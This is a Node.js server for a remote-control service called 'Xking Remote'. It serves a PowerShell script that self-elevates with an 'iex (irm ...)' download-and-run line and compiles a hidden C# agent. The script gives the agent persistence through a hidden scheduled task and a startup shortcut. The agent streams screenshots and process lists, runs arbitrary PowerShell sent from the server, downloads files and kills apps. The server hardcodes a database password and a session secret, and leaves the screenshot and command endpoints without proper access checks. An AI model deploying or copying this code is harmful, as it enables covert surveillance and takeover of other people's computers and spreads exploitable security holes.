const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const { Pool } = require('pg');
const pgSession = require('connect-pg-simple')(session);

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8, cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;
const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://neondb_owner:npg_IDTf1tmWQ0hZ@ep-shy-morning-ai794t5w-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require';

const pool = new Pool({ connectionString: DATABASE_URL, ssl: { rejectUnauthorized: false } });

async function initDB() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS "session" ("sid" varchar NOT NULL COLLATE "default","sess" json NOT NULL,"expire" timestamp(6) NOT NULL) WITH (OIDS=FALSE);
            DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname='session_pkey') THEN ALTER TABLE "session" ADD CONSTRAINT "session_pkey" PRIMARY KEY ("sid") NOT DEFERRABLE INITIALLY IMMEDIATE; END IF; END $$;
            CREATE INDEX IF NOT EXISTS "IDX_session_expire" ON "session" ("expire");
            CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password TEXT, email TEXT, security_info JSONB);
            CREATE TABLE IF NOT EXISTS devices (id TEXT PRIMARY KEY, name TEXT, owner TEXT, status TEXT DEFAULT 'Offline', last_seen BIGINT, last_screen TEXT, processes TEXT);
            CREATE TABLE IF NOT EXISTS commands (device_id TEXT PRIMARY KEY, command_data JSONB);
            CREATE TABLE IF NOT EXISTS control_events (device_id TEXT, event_data JSONB, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
        `);
        // Ensure columns exist
        await client.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_screen TEXT`);
        await client.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS processes TEXT`);
    } finally { client.release(); }
}
initDB().catch(console.error);

app.set('trust proxy', 1);

// Static files moved to top for reliability
app.use('/static', express.static(path.join(__dirname, 'static')));

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

app.use(session({
    store: new pgSession({ pool, tableName: 'session' }),
    secret: process.env.SESSION_SECRET || 'xkingremote_secret_998811',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }
}));

function isAuthenticated(req, res, next) {
    if (req.session.user) return next();
    if (req.path.startsWith('/api')) return res.status(401).json({ success: false });
    res.redirect('/login');
}

// ─── Auth ─────────────────────────────────────────────────────────────────────

app.post('/api/register', async (req, res) => {
    const { username, password, email, security_question, security_answer } = req.body;
    const hashed = await bcrypt.hash(password, 10);
    try {
        await pool.query('INSERT INTO users (username, password, email, security_info) VALUES ($1,$2,$3,$4)',
            [username, hashed, email, { q: security_question, a: security_answer }]);
        res.json({ success: true, redirect: '/login' });
    } catch { res.json({ success: false, message: 'اسم المستخدم موجود بالفعل' }); }
});

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    const result = await pool.query('SELECT * FROM users WHERE username=$1', [username]);
    const user = result.rows[0];
    if (user && await bcrypt.compare(password, user.password)) {
        req.session.user = { username: user.username };
        req.session.save((err) => {
            if (err) console.error("Session save error:", err);
            res.json({ success: true, redirect: '/dashboard', username: user.username });
        });
    } else {
        res.json({ success: false, message: 'خطأ في البيانات' });
    }
});

app.post('/api/logout', (req, res) => { req.session.destroy(); res.json({ success: true }); });

// ─── Device Management ────────────────────────────────────────────────────────

app.get('/api/devices', isAuthenticated, async (req, res) => {
    const result = await pool.query('SELECT id, name, owner, status, last_seen, processes FROM devices WHERE owner=$1', [req.session.user.username]);
    res.json(result.rows);
});

app.post('/api/devices', isAuthenticated, async (req, res) => {
    const { name } = req.body;
    const id = Math.random().toString(36).substr(2, 9);
    await pool.query('INSERT INTO devices (id, name, owner) VALUES ($1,$2,$3)', [id, name, req.session.user.username]);
    res.json({ id, name });
});

app.delete('/api/devices/:id', isAuthenticated, async (req, res) => {
    await pool.query('DELETE FROM devices WHERE id=$1 AND owner=$2', [req.params.id, req.session.user.username]);
    await pool.query('DELETE FROM commands WHERE device_id=$1', [req.params.id]);
    res.json({ success: true });
});

app.post('/api/command', isAuthenticated, async (req, res) => {
    const { deviceId, command, args } = req.body;
    await pool.query('INSERT INTO commands (device_id, command_data) VALUES ($1,$2) ON CONFLICT (device_id) DO UPDATE SET command_data=$2',
        [deviceId, { type: command, args: args || {} }]);
    res.json({ success: true });
});

app.get('/api/poll/:id', async (req, res) => {
    const { id } = req.params;
    const procs = req.query.procs || "";
    if (procs) {
        await pool.query('UPDATE devices SET status=$1, last_seen=$2, processes=$3 WHERE id=$4', ['Online', Date.now(), procs, id]);
    } else {
        await pool.query('UPDATE devices SET status=$1, last_seen=$2 WHERE id=$3', ['Online', Date.now(), id]);
    }
    const cmdResult = await pool.query('SELECT command_data FROM commands WHERE device_id=$1', [id]);
    let command = null;
    if (cmdResult.rows.length > 0) {
        command = cmdResult.rows[0].command_data;
        await pool.query('DELETE FROM commands WHERE device_id=$1', [id]);
    }
    const eventsResult = await pool.query('SELECT event_data FROM control_events WHERE device_id=$1 ORDER BY created_at ASC LIMIT 10', [id]);
    const events = eventsResult.rows.map(r => r.event_data);
    if (events.length > 0) await pool.query('DELETE FROM control_events WHERE device_id=$1', [id]);
    res.json({ command, events });
});

app.post('/api/screen/:id', async (req, res) => {
    const { id } = req.params;
    const { image } = req.body;
    if (image) await pool.query('UPDATE devices SET last_screen=$1 WHERE id=$2', [image, id]);
    res.json({ success: true });
});

app.get('/api/screen-get/:id', async (req, res) => {
    const result = await pool.query('SELECT last_screen FROM devices WHERE id=$1', [req.params.id]);
    res.json({ image: result.rows.length > 0 ? result.rows[0].last_screen : null });
});

app.post('/api/control/:id', isAuthenticated, async (req, res) => {
    await pool.query('INSERT INTO control_events (device_id, event_data) VALUES ($1,$2)', [req.params.id, req.body]);
    res.json({ success: true });
});

app.get('/api/client/:id', (req, res) => {
    const { id } = req.params;
    const proto = req.headers['x-forwarded-proto'] || 'http';
    const url = `${proto}://${req.get('host')}`;

    const script = `
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$serverUrl  = "${url}"
$deviceId   = "${id}"
$taskName   = "XkingRemoteAgent"
$installDir = "$env:ProgramFiles\\XkingRemote"
$exePath    = "$installDir\\XkingRemoteAgent.exe"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \`"iex (irm '$serverUrl/api/client/$deviceId')\`""
    exit
}

schtasks /Delete /TN $taskName /F 2>$null | Out-Null
Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'XkingRemoteService' -ErrorAction SilentlyContinue
Stop-Process -Name "XkingRemoteAgent" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

$src = @'
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Web.Script.Serialization;
using System.Linq;

class XkingRemoteAgent {
    [DllImport("user32.dll")] static extern void mouse_event(int f, int dx, int dy, int d, int e);
    static readonly string SERVER = "IREMOTE_SERVER_URL";
    static readonly string DEVICE = "IREMOTE_DEVICE_ID";

    static void Main() {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.BelowNormal;
        var json = new JavaScriptSerializer { MaxJsonLength = 67108864 };
        int procCounter = 0;
        char q = (char)34;
        
        while (true) {
            try {
                // Get process list every 5 pollings (approx every 3-5 seconds)
                string procsArg = "";
                if (procCounter % 5 == 0) {
                     var procs = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).Select(p => p.ProcessName).Distinct().ToArray();
                     procsArg = "?procs=" + WebUtility.UrlEncode(string.Join(",", procs));
                }
                procCounter++;

                string raw = Get(SERVER + "/api/poll/" + DEVICE + procsArg);
                var data = json.Deserialize<Dictionary<string, object>>(raw);
                
                if (data.ContainsKey("events") && data["events"] != null) {
                    foreach (object obj in (ArrayList)data["events"]) {
                        var ev = obj as Dictionary<string, object>;
                        if (ev != null && ev.ContainsKey("type") && ev["type"].ToString() == "mouse") {
                            int sx = Screen.PrimaryScreen.Bounds.Width, sy = Screen.PrimaryScreen.Bounds.Height;
                            Cursor.Position = new System.Drawing.Point((int)(Convert.ToDouble(ev["x"]) * sx), (int)(Convert.ToDouble(ev["y"]) * sy));
                            if (ev.ContainsKey("click") && (bool)ev["click"])
                                mouse_event(ev["button"].ToString() == "right" ? 0x08|0x10 : 0x02|0x04, 0,0,0,0);
                        }
                    }
                }
                
                if (data.ContainsKey("command") && data["command"] != null) {
                    var cmd = data["command"] as Dictionary<string, object>;
                    string t = cmd.ContainsKey("type") ? cmd["type"].ToString() : "";
                    var args = cmd.ContainsKey("args") ? cmd["args"] as Dictionary<string, object> : null;
                    switch (t) {
                        case "shutdown": Run("shutdown", "/s /t 0"); break;
                        case "restart":  Run("shutdown", "/r /t 0"); break;
                        case "sleep":
                        case "zap":      Application.SetSuspendState(PowerState.Suspend, false, false); break;
                        case "kill_apps":
                            string apps = "Discord,chrome,Code,Steam,EpicGamesLauncher,EADesktop,Cursor,opera,brave,RevoUninPro,OpenIV,PaintDotNet,Antigravity";
                            Run("powershell", "-WindowStyle Hidden -Command " + q + "Stop-Process -Name " + apps + " -Force -ErrorAction SilentlyContinue" + q);
                            break;
                        case "kill_process":
                            if (args != null && args.ContainsKey("name")) {
                                Run("powershell", "-WindowStyle Hidden -Command " + q + "Stop-Process -Name " + args["name"].ToString() + " -Force -ErrorAction SilentlyContinue" + q);
                            }
                            break;
                        case "download":
                            if (args != null && args.ContainsKey("url")) {
                                string url = args["url"].ToString();
                                string name = Path.GetFileName(url.Split('?')[0]);
                                string dest = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads", name);
                                Run("powershell", "-WindowStyle Hidden -Command " + q + "Invoke-WebRequest -Uri '" + url + "' -OutFile '" + dest + "'" + q);
                            }
                            break;
                        case "custom":
                            if (args != null && args.ContainsKey("code"))
                                Run("powershell", "-WindowStyle Hidden -Command " + q + args["code"].ToString() + q);
                            break;
                    }
                }
                SendScreen();
                Thread.Sleep(2500); // Polling every 2.5s to significantly save Vercel fast origin transfer bandwidth
            } catch { Thread.Sleep(3000); }
        }
    }

    static void SendScreen() {
        try {
            char q = (char)34;
            Rectangle b = Screen.PrimaryScreen.Bounds;
            using (var bmp = new Bitmap(b.Width, b.Height))
            using (var g = Graphics.FromImage(bmp)) {
                g.CopyFromScreen(b.X, b.Y, 0, 0, b.Size);
                using (var ms = new MemoryStream()) {
                    ImageCodecInfo codec = null;
                    foreach (var c in ImageCodecInfo.GetImageEncoders()) if (c.FormatDescription == "JPEG") { codec = c; break; }
                    var ep = new EncoderParameters(1);
                    ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 25L);
                    bmp.Save(ms, codec, ep);
                    string b64 = Convert.ToBase64String(ms.ToArray());
                    string body = "{" + q + "image" + q + ":" + q + "data:image/jpeg;base64," + b64 + q + "}";
                    Post(SERVER + "/api/screen/" + DEVICE, body);
                }
            }
        } catch {}
    }

    static string Get(string url) {
        var wc = new WebClient();
        wc.Headers[HttpRequestHeader.Accept] = "application/json";
        return wc.DownloadString(url);
    }
    static void Post(string url, string body) {
        var wc = new WebClient();
        wc.Headers[HttpRequestHeader.ContentType] = "application/json";
        wc.UploadString(url, body);
    }
    static void Run(string exe, string args) {
        Process.Start(new ProcessStartInfo(exe, args) { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
    }
}
'@

$src = $src.Replace("IREMOTE_SERVER_URL", $serverUrl).Replace("IREMOTE_DEVICE_ID", $deviceId)
Add-Type -TypeDefinition $src -OutputAssembly $exePath -OutputType WindowsApplication -ReferencedAssemblies "System.Windows.Forms","System.Drawing","System.Web.Extensions","System.Core" -ErrorAction Stop

$action   = New-ScheduledTaskAction -Execute $exePath
$trigger  = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupFolder\\XkingRemoteAgent.lnk"
try {
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $exePath
    $shortcut.WindowStyle = 7
    $shortcut.Save()
} catch {}

Start-Process -FilePath $exePath -WindowStyle Hidden
Write-Host "Xking Remote: Agent Fixed and Installed." -ForegroundColor Green
`.trim();
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(script);
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/register', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', isAuthenticated, (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/screen/:id', isAuthenticated, (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

if (require.main === module) {
    server.listen(PORT, () => console.log(`Xking Remote running on port ${PORT}`));
}
module.exports = app;
